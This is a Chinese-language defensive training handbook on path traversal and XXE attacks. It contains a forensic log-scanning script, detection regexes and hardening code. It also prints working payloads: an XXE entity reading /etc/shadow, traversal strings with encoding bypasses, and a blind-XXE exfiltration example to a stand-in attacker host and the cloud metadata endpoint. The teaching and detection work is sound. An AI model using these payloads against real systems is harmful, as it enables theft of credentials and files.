> **情境帶入**：  
> 週二上午 11:30，SOC 威脅情資告警跳出緊急提示：公司核心 Linux 伺服器的 `/etc/shadow` 密碼雜湊，竟然出現在 Pastebin 與暗網黑客論壇上！  
> 
> 系統維運人員百思不得其解：「這台伺服器是純粹的靜態 Web 展示站，上面連資料庫（MySQL）都沒裝，根本沒有 SQL 注入漏洞；SSH 埠也只對堡壘機開放，黑客到底是用什麼妖法直接把系統底層的帳號檔案給偷走的？」  
> 
> 分析師調出這台 Web 主機的 Nginx 存取日誌，在成千上萬筆 200 OK 請求中，發現了兩類極端詭異的痕跡：  
> 1. 第一處：在一個看似無害的圖片加載功能中，URL 參數帶有：  
>    `GET /load_image?filename=....//....//....//etc/passwd HTTP/1.1`  
> 2. 第二處：在一個支援上傳自定義 XML 發票的 API 端點中，POST 請求主體開頭赫然寫著：  
>    `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>`  
>    而在伺服器回傳的發票預覽結果中，竟然明明白白地印出了全機使用者的密碼雜湊！  
> 
> 這是典型的 **檔案路徑穿越（Path Traversal / Directory Traversal）** 與 **XML 外部實體注入（XXE - XML External Entity）**！  
> 為什麼很多程式碼就算寫了 `replace("../", "")` 過濾，在黑客面前依然一秒被破？XML 解析器為什麼會「聽話」地幫黑客去本機讀檔案甚至發起內網 SSRF 探測？
>
> **本手冊的使命**：帶你深入檔案系統路徑解析與 XML 解析器語法樹底層，掌握多重編碼繞過（`%252e%252e%252f`）、雙寫繞過（`....//`）、PHP 偽協定封裝（`php://filter`）與 DTD 實體注入的封包特徵，熟練運用 Linux 日誌與 Python 自動化檢測腳本提取 Payload，並掌握徹底禁用 DTD 與白名單規範化路徑的防禦絕技。

## 🧩 第一動：底層機制解剖——檔案系統與 XML 解析器的「背叛」

這兩類漏洞的物理本質，都在於**應用程式在解析輸入時，賦予了特定語法字元（`../` 或 `<!ENTITY>`）超乎預期的系統執行特權**。

### 1.1 檔案路徑穿越（Path Traversal）的物理原理

在作業系統中，`.` 代表當前目錄，`..` 代表上一層父目錄。當程式碼寫成：  
`$filepath = "/var/www/html/images/" . $_GET['file'];`  
`include($filepath);` 或 `readfile($filepath);` 時：

```
[黑客輸入: ../../../../etc/passwd]
路徑拼接結果: /var/www/html/images/../../../../etc/passwd

[作業系統解析路徑 (Canonicalization)]:
/var/www/html/images/../ ➔ 回到 /var/www/html/
/var/www/html/../        ➔ 回到 /var/www/
/var/www/../             ➔ 回到 /var/
/var/../                 ➔ 回到 / (根目錄！)
最終存取目標: /etc/passwd！黑客成功跳出 Web 目錄，讀取任意敏感檔案！
```

### 1.2 XML 外部實體注入（XXE）的解析機制

XML 允許在文檔開頭使用 **DTD（文檔類型定義 - Document Type Definition）** 定義巨集變數（Entity，實體）。  
如果 XML 解析器預設**開啟了外部實體解析（External Entities Enabled）**，黑客就能指示解析器使用 `SYSTEM` 關鍵字，主動抓取本機檔案或外網 URL：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- ★ 定義外部實體引用本機檔案 -->
]>
<userInfo>
  <name>&xxe;</name>                         <!-- ★ 解析器在解析時，自動將 &xxe; 替換為 /etc/passwd 內容！ -->
  <email>user@corp.local</email>
</userInfo>
```

- **PHP 偽協定（PHP Wrappers）**：黑客常利用 `php://filter/read=convert.base64-encode/resource=config.php`，以 Base64 形式將 PHP 源代碼完整讀出，規避 PHP 代碼被伺服器直接執行而無法查看源碼的問題。
- **Billion Laughs 拒絕服務（XML 炸彈）**：透過 10 層巢狀實體遞迴放大（每個實體擴展成 10 個自身），1 KB 的 XML 封包在解析時會膨脹成 3 GB 記憶體佔用，瞬間癱瘓伺服器。

## 🧭 第二動：解碼意圖——異常特徵與繞過手法速查表

在分析 Web 請求時，黑客為了規避簡單的字串過濾，會使用多種混淆與編碼手法：

### 2.1 路徑穿越與 XXE 異常速查表

| 請求與封包特徵現象（看到什麼） | 底層成因與攻擊手法（是什麼攻擊） | 威脅影響與處置優先級（怎麼應對） |
| :--- | :--- | :--- |
| **參數包含 `../`, `..%2f`, `..%5c`** | **基礎路徑穿越 (Standard Directory Traversal)**：<br>攻擊者使用相對路徑跨越目錄結構，企圖讀取設定檔或系統敏感檔案。 | • **影響**：Web 源碼與敏感憑證外洩。<br>• **處置優先級**：🔴 高（WAF 立即阻斷並修復路徑拼接）。 |
| **參數包含 `....//` 或 `..././`** | **雙寫繞過過濾 (Recursive Replacement Bypass)**：<br>後端程式僅使用單次替換 `replace("../", "")`，過濾後內部殘餘字元重新拼裝成新的 `../`。 | • **影響**：粗糙過濾被輕鬆繞過。<br>• **處置優先級**：🔴 高（改用正規路徑規範化 API）。 |
| **參數包含 `%252e%252e%252f`** | **多重 URL 編碼繞過 (Double URL Encoding)**：<br>WAF 僅解碼一次看到 `%2e%2e%2f` 放行，但後端 Web 容器（如 Tomcat）自動進行第二次解碼還原為 `../`。 | • **影響**：WAF 邊界防禦形同虛設。<br>• **處置優先級**：🔴 高（確保 WAF 具備多重解碼檢測能力）。 |
| **參數結尾包含 `%00` (Null Byte 截斷)** | **空字節截斷攻擊 (Null Byte Injection)**：<br>舊版 PHP/C 底層將 `%00` 視為字串結尾符，強制截斷後端硬編碼的副檔名（如 `.jpg`）。 | • **影響**：繞過副檔名限制讀取任意檔案。<br>• **處置優先級**：🟡 中至高（升級運行時環境並加固）。 |
| **POST 酬載包含 `<!DOCTYPE` 與 `SYSTEM "file://`** | **XML 外部實體注入 (Classic XXE)**：<br>攻擊者利用 XML 解析器漏洞，強制讀取主機系統底層檔案並透過前端回顯。 | • **影響**：系統核心密碼或私鑰外洩。<br>• **處置優先級**：🚨 緊急（立即在後端禁用 DTD 解析）。 |
| **POST 酬載包含 `SYSTEM "http://.../evil.dtd"`** | **盲注/帶外資料外洩 (Blind XXE / OOB Exfiltration)**：<br>當頁面無回顯時，黑客引導 XML 解析器載入外部惡意 DTD，將竊取的檔案資料以 Base64 拼裝在 HTTP 參數中外傳至黑客伺服器。 | • **影響**：靜默竊取資料且具備內網穿透能力。<br>• **處置優先級**：🚨 緊急（阻斷伺服器未授權外聯連線）。 |

### 3.1 Linux 現場快篩 Nginx / Apache 存取日誌

```bash
grep -Ei "(\.\./|%2e%2e)" /var/log/nginx/access.log | awk '{print $7}' | sort | uniq -c | sort -nr | head -n 10
```

### 3.2 Python 自動化路徑穿越與 XXE 取證腳本

將檢測邏輯封裝為一鍵執行的取證腳本 `web_traversal_xxe_forensics.py`：

```python
#!/usr/bin/env python3
"""
路徑穿越與 XXE 自動化日誌鑑識工具 (web_traversal_xxe_forensics.py)
功能：掃描 Web 存取日誌與封包記錄，標記路徑穿越深度、多重編碼繞過與外部實體引用
"""
import re
import sys
import urllib.parse

TRAVERSAL_PATTERN = re.compile(r"(\.\./|\.\.\|%2e%2e|%252e|etc/(passwd|shadow)|win\.ini|boot\.ini|/proc/self/)", re.IGNORECASE)
XXE_PATTERN = re.compile(r"(<!ENTITY|SYSTEM\s+(?:'|")(?:file|http|https|ftp|php)://|<!DOCTYPE)", re.IGNORECASE)

def audit_log(file_path):
    print(f"[*] 啟動路徑穿越與 XXE 稽核: {file_path}")
    traversal_hits = 0
    xxe_hits = 0

    with open(file_path, "r", errors="ignore") as f:
        for line_num, line in enumerate(f, 1):
            decoded_line = urllib.parse.unquote(urllib.parse.unquote(line))
            
            if TRAVERSAL_PATTERN.search(decoded_line):
                traversal_hits += 1
                if " 200 " in line:
                    print(f"🚨 [路徑穿越成功嫌疑 (200 OK)] 第 {line_num} 行: {decoded_line.strip()[:140]}")
                    
            if XXE_PATTERN.search(decoded_line):
                xxe_hits += 1
                print(f"🚨 [XXE 實體宣告偵測] 第 {line_num} 行: {decoded_line.strip()[:140]}")

    print(f"[*] 稽核完成。路徑穿越命中: {traversal_hits} 筆，XXE 命中: {xxe_hits} 筆。")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python web_traversal_xxe_forensics.py <access.log>")
        sys.exit(1)
    audit_log(sys.argv[1])
```

## 🛡️ 第五動：根除與加固 SOP (Mitigation & Hardening)

防禦路徑穿越與 XXE，必須在代碼架構層面進行「硬性防護」：

### 1. XXE 唯一根本解法：全面禁用 DTD 與外部實體
在呼叫 XML 解析器時，**明確將 DTD 解析功能關閉**（依開發語言不同配置）：

```java
// ✅ Java (DocumentBuilderFactory) 防禦 XXE 金標準
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// 1. 完全禁用 DTD
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// 2. 即使允許 DTD，也禁止載入外部一般實體與參數實體
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```php
// ✅ PHP (libxml) 防禦 XXE
libxml_disable_entity_loader(true); // 禁用外部實體加載
```

### 2. 路徑穿越根本防禦：路徑規範化與白名單校驗
嚴禁直接字串拼接！必須將使用者輸入進行**路徑解析（Canonicalization / Normalize）**，並強制校驗最終路徑是否在預期目錄內：

```python
import os

# ✅ Python 安全檔案讀取範例
BASE_DIR = "/var/www/html/uploads"
user_input = request.args.get("file")

# 1. 取得絕對規範化路徑 (會自動解析掉所有 ../)
target_path = os.path.realpath(os.path.join(BASE_DIR, user_input))

# 2. 嚴格校驗目標路徑是否依然以合法基礎目錄開頭！
if not target_path.startswith(BASE_DIR + os.sep):
    raise SecurityException("🚨 偵測到非法路徑穿越攻擊！")

# 3. 安全讀取
with open(target_path, "rb") as f:
    data = f.read()
```

## 🎯 第六動：靶場實戰檢驗 (Hands-on Lab Walkthrough)

請帶著剛才學到的穿越繞過與實體注入技能，進入真實靶場：

### 推薦靶場 1：[PortSwigger - File Path Traversal (Simple Case)](https://portswigger.net/web-security/file-path-traversal/lab-simple)
- **靶場背景**：商品圖片載入功能未進行任何過濾。
- **作戰任務**：
  1. 使用 Burp Suite 攔截圖片讀取請求：`GET /image?filename=21.jpg`。

## 📋 第七動：過關驗收檢查點 (Mastery Checklist)

不看筆記，試著回答以下 5 個實戰問題。若都能回答，代表你已徹底掌握檔案穿越與 XXE 防禦：

- [ ] **Q1**：某工程師在程式碼中寫了 `replace("../", "")` 來防禦路徑穿越。攻擊者輸入什麼樣的字串（提示：雙寫）就能輕易繞過此過濾？為什麼？
  > **解答要點**：攻擊者輸入 `....//` 或 `..././` 即可繞過。因為簡單的字串替換函式通常只執行單次由左至右的掃描匹配，當把字串中間的 `../` 剝除後，外層殘留的字元（前段的 `..` 與後段的 `/`）會重新貼合拼接成一個全新的 `../`。若要徹底防禦，必須使用作業系統層級的路徑規範化 API，而非簡單的字串替換。
- [ ] **Q2**：什麼是 **多重 URL 編碼（Double URL Encoding）**？為什麼 `%252e%252e%252f` 在某些通過 WAF 防禦的系統中，依然能成功觸發路徑穿越？
  > **解答要點**：點號 `.` 的標準 URL 編碼為 `%2e`，若對其中的百分比符號 `%` 再次編碼，`%` 變成 `%25`，整體便轉化為 `%252e`。當請求經過邊界 WAF 時，WAF 僅執行一次 URL 解碼，看到的是 `%2e%2e%2f`，誤以為是普通的檔名而予以放行；但當請求抵達後端 Web 容器（如 Tomcat 或 IIS）時，容器預設執行第二次解碼，將其還原為真實的 `../`，從而成功穿透邊界防護。
- [ ] **Q3**：在 XXE 攻擊中，XML 語法裡的 **`SYSTEM` 關鍵字** 代表什麼意義？攻擊者除了用它讀取本機 `file:///` 之外，還能利用它發起什麼網路層級的衍生攻擊？
  > **解答要點**：`SYSTEM` 關鍵字告訴 XML 解析器該實體是一個「外部實體（External Entity）」，其值需要從指定的 URI 資源中動態載入。除了利用 `file:///` 協定讀取本機檔案外，黑客還能傳入 `http://` 協定，強迫後端伺服器向內網隔離的主機或雲端 Metadata 服務（如 `http://169.254.169.254/latest/meta-data/`）發起 HTTP 請求，這就是將 XXE 轉化為 **伺服器端請求偽造（SSRF）** 的高危攻擊手法。
- [ ] **Q4**：什麼是 **盲注 XXE（Blind XXE / Out-of-Band XXE）**？當 Web 頁面完全不會回顯任何 XML 內容或錯誤訊息時，黑客是如何把偷到的檔案資料帶出外部網路的？
  > **解答要點**：在沒有任何頁面回顯或報錯的環境下，黑客在攻擊 Payload 中引導伺服器加載一個遠端惡意 DTD 檔案。該外部 DTD 中定義了參數實體（Parameter Entity），先透過 `file:///` 讀取敏感檔案並進行 Base64 編碼，接著將編碼後的檔案內容拼裝在一個 HTTP GET 請求的 URL 參數中（例如 `http://attacker.com/?data=<base64>`）。伺服器在解析實體時會主動外聯黑客伺服器，黑客透過伺服器的 Web 存取日誌即可完整還原被盜取的資料。
- [ ] **Q5**：在防禦路徑穿越時，為什麼單純檢查「字串中是否包含 `..`」是不夠安全的？業界推薦的「路徑規範化（Path Normalization）」在底層是如何運作的？
  > **解答要點**：單純檢查字串容易被各種邊界條件繞過，包括符號連結（Symlink）跳轉、Windows 下的絕對路徑（如 `C:\boot.ini`）、斜線反斜線混用、空字節截斷等。業界推薦的規範化機制（如 Java 的 `getCanonicalPath()` 或 Python 的 `os.path.realpath()`）在底層會真正向作業系統核心請求解析所有的相對符號、環境變數與軟連結，計算出檔案在磁碟上的絕對物理路徑；防守方接著只需要驗證該絕對路徑的前綴是否嚴格等於合法的基礎目錄（`target_path.startswith(BASE_DIR)`），即可杜絕任何跳出目錄的企圖。\n
